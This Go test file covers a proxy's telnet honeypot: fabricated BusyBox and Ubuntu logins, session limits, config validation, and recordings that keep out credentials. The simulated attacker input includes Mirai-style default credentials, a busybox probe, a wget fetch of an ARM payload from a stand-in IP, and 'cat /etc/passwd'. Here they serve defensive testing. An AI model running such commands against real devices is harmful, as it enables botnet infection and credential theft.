package telnet_test

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/rom/xproxy/internal/config"
	"github.com/rom/xproxy/internal/proxy"
	"github.com/rom/xproxy/internal/proxytest"
)

// A device that is not there, through the whole listener.
//
// What is worth asserting here is the wiring and the two rules: a session that
// was going to reach the equipment is never answered by the fabrication, and the
// credential the visitor offered does not appear in anything the proxy writes.

// decoyTelnetYAML is a honeypot: no upstream, because there is no equipment.
const decoyTelnetYAML = `
version: 1
server:
  listeners:
    - name: legacy
      address: "127.0.0.1:0"
      kind: telnet
      telnet:
        deception:
          mode: decoy
          profile: busybox
          hostname: cam-07
          attempts: 2
          tripwire: [payroll]
logging: {access: {enabled: false}}
`

// login runs the fabricated login exchange and leaves the connection at the
// shell prompt.
func (c *conn) login(t *testing.T, user, pass string, attempts int) string {
	t.Helper()
	var all string
	for i := 0; i < attempts; i++ {
		all += c.readUntil("login: ")
		c.write([]byte(user + "\r\n"))
		all += c.readUntil("Password: ")
		c.write([]byte(pass + "\r\n"))
	}
	return all
}

// shell sends one command and reads up to the next prompt.
func (c *conn) shell(t *testing.T, line, prompt string) string {
	t.Helper()
	c.write([]byte(line + "\r\n"))
	return c.readUntil(prompt)
}

// A honeypot: it greets, it takes credentials, and there is nothing behind it.
func TestADecoyTelnetListenerAnswersWithNoEquipmentBehindIt(t *testing.T) {
	s := proxytest.Start(t, decoyTelnetYAML)
	c := dial(t, s.Addrs()["legacy"])

	// The first credential is refused and the second accepted, which is what a
	// real device's login looks like and what collects more of the dictionary.
	// Neither outcome depends on which credential was offered.
	first := c.readUntil("login: ")
	if !strings.Contains(first, "cam-07 login:") {
		t.Errorf("the login prompt is %q, and the hostname is the operator's", first)
	}
	c.write([]byte("root\r\n"))
	c.readUntil("Password: ")
	c.write([]byte("xc3511\r\n"))
	if got := c.readUntil("login: "); !strings.Contains(got, "Login incorrect") {
		t.Errorf("the first attempt answered %q", got)
	}
	c.write([]byte("admin\r\n"))
	c.readUntil("Password: ")
	c.write([]byte("1234\r\n"))

	// And then a shell, which is where the intelligence is.
	motd := c.readUntil("admin@cam-07")
	if !strings.Contains(motd, "BusyBox") {
		t.Errorf("the login answered %q", motd)
	}
	if got := c.shell(t, "uname -a", "admin@cam-07"); !strings.Contains(got, "cam-07") {
		t.Errorf("uname -a answered %q", got)
	}
	if got := c.shell(t, "/bin/busybox MIRAI", "admin@cam-07"); !strings.Contains(got, "applet not found") {
		t.Errorf("the busybox probe answered %q", got)
	}
	// The command that matters: the payload's address is collected and the
	// fetch fails, because nothing here fetches anything.
	got := c.shell(t, "wget http://198.51.100.9/bins/x.arm7 -O /tmp/x", "admin@cam-07")
	if !strings.Contains(got, "connect") {
		t.Errorf("wget answered %q", got)
	}
	awaitTelnet(t, s, func(sn proxy.Snapshot) bool { return sn.TelnetTripwire >= 1 },
		"the escalation did not trip the wire")
	awaitTelnet(t, s, func(sn proxy.Snapshot) bool { return sn.TelnetDeceived >= 6 },
		"the deception counter did not move")

	// The status view knows about it, which is where an operator looks.
	st, ok := telnetDecoyStatus(s)
	if !ok {
		t.Fatal("the listener reported no decoy")
	}
	if st.Mode != "decoy" || st.Kind != "telnet" || st.Profile != "busybox" {
		t.Errorf("status %+v", st)
	}
	if st.Served == 0 || st.Tripped == 0 || !st.Anyone || len(st.Visitors) != 1 {
		t.Errorf("status %+v", st)
	}
	// And leaving ends the session rather than the listener.
	c.write([]byte("exit\r\n"))
	if got := c.readUntil("logout"); !strings.Contains(got, "logout") {
		t.Errorf("exit answered %q", got)
	}
}

// A session is bounded in commands as well as in time, so that a script in a
// loop cannot hold a worker on a listener whose whole purpose is to be found.
func TestAFabricatedSessionIsBoundedInCommands(t *testing.T) {
	s := proxytest.Start(t, decoyTelnetYAML)
	c := dial(t, s.Addrs()["legacy"])
	c.login(t, "root", "1234", 2)
	c.readUntil("root@cam-07")
	// Past the bound the session ends. It is not an error and not a refusal:
	// what was worth collecting was collected several hundred commands ago.
	var last string
	for i := 0; i < 600; i++ {
		c.write([]byte("id\r\n"))
		last = c.readUntil("root@cam-07")
		if last == "" || !strings.Contains(last, "uid=0") {
			break
		}
	}
	if strings.Contains(last, "uid=0") {
		t.Error("six hundred commands were all answered")
	}
}

// The same fabrication on a listener that fronts real equipment: it answers where
// a refusal would be written, and nowhere else.
//
// That is the invariant the whole feature rests on -- a session on its way to the
// equipment is never answered by the fabrication -- and this is the test of it.
func TestOnARealTelnetListenerOnlyRefusalsAreFabricated(t *testing.T) {
	file, _ := enrol(t, "alice")
	s, addr, tg := gateway(t, fmt.Sprintf(`        mfa:
          file: %s
          require_enrolment: true
        deception:
          mode: answer
          clients: ["127.0.0.0/8"]
          profile: linux
          hostname: app-77
`, file))
	// A name with no enrolment fails the factor, which is a session that was
	// never going to reach the equipment. It gets the fabrication.
	c := dial(t, addr)
	c.readUntil("login: ")
	c.write([]byte("stranger\r\n"))
	c.readUntil("code: ")
	c.write([]byte("000000\r\n"))
	got := c.readUntil("login: ")
	if !strings.Contains(got, "app-77 login:") {
		t.Fatalf("a failed factor answered %q", got)
	}
	c.write([]byte("root\r\n"))
	c.readUntil("Password: ")
	c.write([]byte("hunter2\r\n"))
	if out := c.readUntil("root@app-77"); !strings.Contains(out, "Ubuntu") {
		t.Errorf("the fabricated login answered %q", out)
	}
	if out := c.shell(t, "id", "root@app-77"); !strings.Contains(out, "uid=0(root)") {
		t.Errorf("id answered %q", out)
	}
	awaitTelnet(t, s, func(sn proxy.Snapshot) bool { return sn.TelnetDeceived >= 2 },
		"the fabrication did not answer the refused session")
	// Nothing reached the equipment, which is the whole point.
	if seen := tg.seen(); len(seen) != 0 {
		t.Fatalf("the fabricated session reached the target: %q", seen)
	}
	// And the refusal counters still moved: the fabrication replaces what the
	// visitor is told, not what the operator is told.
	if n := s.Stats().Refusals["telnet"]["mfa_failed"]; n < 1 {
		t.Errorf("the refusal was not counted: %+v", s.Stats().Refusals["telnet"])
	}
}

// A client outside the section's list is refused rather than lied to.
func TestATelnetClientOutsideTheListIsStillRefused(t *testing.T) {
	file, _ := enrol(t, "alice")
	s, addr, _ := gateway(t, fmt.Sprintf(`        mfa:
          file: %s
          require_enrolment: true
        deception:
          mode: answer
          clients: ["10.9.0.0/24"]
`, file))
	c := dial(t, addr)
	c.readUntil("login: ")
	c.write([]byte("stranger\r\n"))
	c.readUntil("code: ")
	c.write([]byte("000000\r\n"))
	if got := c.readUntil("not accepted"); !strings.Contains(got, "not accepted") {
		t.Errorf("a client outside the list was answered %q", got)
	}
	if n := s.Stats().TelnetDeceived; n != 0 {
		t.Errorf("the fabrication answered %d exchanges for a client outside its list", n)
	}
}

// What a decoy listener refuses to load: the settings it would silently ignore.
func TestWhatADecoyTelnetListenerRefusesToLoad(t *testing.T) {
	for _, tc := range []struct{ name, section, wants string }{
		{
			name:    "a decoy with an upstream is a contradiction",
			section: "        upstream: kit\n        deception: {mode: decoy}",
			wants:   "decoy is the whole listener",
		},
		{
			// The decoy's own login prompt is the trap and accepts everybody,
			// so a factor in front of it would refuse the visitors it exists
			// to collect.
			name:    "a decoy with a second factor",
			section: "        deception: {mode: decoy}\n        mfa: {file: /dev/null}",
			wants:   "would refuse the visitors",
		},
		{
			name:    "a decoy that checks a grant",
			section: "        deception: {mode: decoy}\n        require_grant: true",
			wants:   "nobody real to check a grant for",
		},
		{
			name:    "answer mode with no client list",
			section: "        upstream: kit\n        deception: {mode: answer}",
			wants:   "clients: required in mode answer",
		},
		{
			name:    "a profile nobody has",
			section: "        deception: {mode: decoy, profile: openwrt}",
			wants:   "is not a profile",
		},
		{
			name:    "more attempts than a login has",
			section: "        deception: {mode: decoy, attempts: 40}",
			wants:   "attempts: must be between 0 and 16",
		},
		{
			name:    "a tripwire with a space in it",
			section: "        deception: {mode: decoy, tripwire: [\"wget http\"]}",
			wants:   "tripwire[0]",
		},
		{
			name:    "a listener with neither an upstream nor a decoy",
			section: "        deception: {mode: decoy, enabled: false}",
			wants:   "upstream: required",
		},
		{
			name:    "and a whole section that is right",
			section: "        deception: {mode: decoy, profile: linux, hostname: app-77, attempts: 3}",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			yaml := `
version: 1
server:
  listeners:
    - name: legacy
      address: "127.0.0.1:0"
      kind: telnet
      telnet:
` + tc.section + `
logging: {access: {enabled: false}}
upstreams:
  - name: kit
    endpoints: [{address: "127.0.0.1:2323"}]
`
			_, err := config.Parse([]byte(yaml))
			switch {
			case tc.wants == "" && err != nil:
				t.Fatalf("did not load: %v", err)
			case tc.wants == "":
			case err == nil:
				t.Fatalf("loaded, want %q", tc.wants)
			case !strings.Contains(err.Error(), tc.wants):
				t.Fatalf("error %v, want %q", err, tc.wants)
			}
		})
	}
}

// The recording holds the commands and not the credential.
//
// A transcript is an artefact, and the rule every kind here follows is that no
// password reaches one. The commands are the intelligence; the credential was
// already reduced to a length and a handle before the recording was opened.
func TestTheFabricatedRecordingHoldsTheCommandsAndNotTheCredential(t *testing.T) {
	dir := t.TempDir()
	yaml := strings.Replace(decoyTelnetYAML, "        deception:",
		"        recording: {directory: "+dir+", input: true}\n        deception:", 1)
	s := proxytest.Start(t, yaml)
	c := dial(t, s.Addrs()["legacy"])
	c.login(t, "root", "correct-horse-battery", 2)
	c.readUntil("root@cam-07")
	c.shell(t, "cat /etc/passwd", "root@cam-07")
	_ = c.c.Close()

	deadline := time.Now().Add(10 * time.Second)
	for s.Stats().TelnetRecorded == 0 {
		if time.Now().After(deadline) {
			t.Fatal("no recording was finished")
		}
		time.Sleep(10 * time.Millisecond)
	}
	files, _ := filepath.Glob(filepath.Join(dir, "*.cast"))
	if len(files) != 1 {
		t.Fatalf("%d recordings, want 1", len(files))
	}
	body, err := os.ReadFile(files[0])
	if err != nil {
		t.Fatal(err)
	}
	text := string(body)
	// The command is there, because that is what the recording is for.
	if !strings.Contains(text, "/etc/passwd") {
		t.Errorf("the recording does not carry the command:\n%s", text)
	}
	// And it is named after the visitor, which is why it is opened after the
	// login rather than before: the name is what the login just produced, and a
	// file called "anonymous" is one nobody can find again.
	if !strings.Contains(text, "root") {
		t.Errorf("the recording does not name the visitor:\n%s", text)
	}
	// The credential is not, in any form. Input recording is on, which is the
	// setting that would otherwise carry it.
	for _, forbidden := range []string{"correct-horse-battery", "Password:"} {
		if strings.Contains(text, forbidden) {
			t.Errorf("the recording carries %q", forbidden)
		}
	}
}

// telnetDecoyStatus finds this listener's decoy in the status view.
func telnetDecoyStatus(s *proxy.Server) (proxy.DecoyStatus, bool) {
	for _, st := range s.DeviceDecoys() {
		if st.Kind == "telnet" {
			return st, true
		}
	}
	return proxy.DecoyStatus{}, false
}

// awaitTelnet polls for a condition, because the gateway runs the session on its
// own goroutine.
func awaitTelnet(t *testing.T, s *proxy.Server, ok func(proxy.Snapshot) bool, what string) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if ok(s.Stats()) {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	sn := s.Stats()
	t.Fatalf("%s: deceived %d, tripped %d", what, sn.TelnetDeceived, sn.TelnetTripwire)
}
